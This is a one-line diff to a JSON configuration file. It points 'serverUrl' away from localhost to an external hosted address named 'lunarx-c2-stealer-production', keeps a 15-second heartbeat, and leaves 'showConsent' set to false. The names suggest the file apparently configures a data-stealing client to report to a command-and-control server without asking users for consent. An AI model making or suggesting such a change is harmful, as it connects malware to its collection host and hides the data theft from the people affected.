@@ -1,5 +1,5 @@
 {
-  "serverUrl": "http://localhost:3000",
+  "serverUrl": "https://lunarx-c2-stealer-production.up.railway.app",
   "heartbeatInterval": 15000,
   "showConsent": false
 }
